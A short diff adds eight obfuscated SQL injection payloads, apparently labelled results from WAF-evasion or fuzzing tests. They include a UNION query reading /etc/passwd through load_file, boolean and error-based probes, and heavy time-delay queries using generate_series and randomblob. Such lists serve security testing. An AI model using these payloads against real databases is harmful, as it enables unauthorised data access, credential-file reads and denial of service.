@@ -1,0 +1,8 @@
+101 success '1 wherE 2060   LIke   2060 '
+145 success 'SELECT count  (  *  )   FrOM generate_series  (  (SelEct 1),5000000  )   AND    (    (   7240   LIke   7240 '
+335 success " union SELECT 1,load_file  (  '/etc/passwd'  )  ,1,1,1; "
+367 success ' (  SELECT   (  cASe WhEN   (  1421   liKe   (seleCt 0x58d)  )   THen 1\nELsE 0x58d*  (  SelECT 1421 frOm master..sysdatabases  )   ENd   )    )  '
+540 success '1 uni/*%~*/ON/**/seLeCT all FrOM WhErE '
+655 success "SELECT lIKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    "
+741 success '1 WhErE 5443   LIKE   5443 '
+932 success '1 whERe 2382   LIke   2382 '
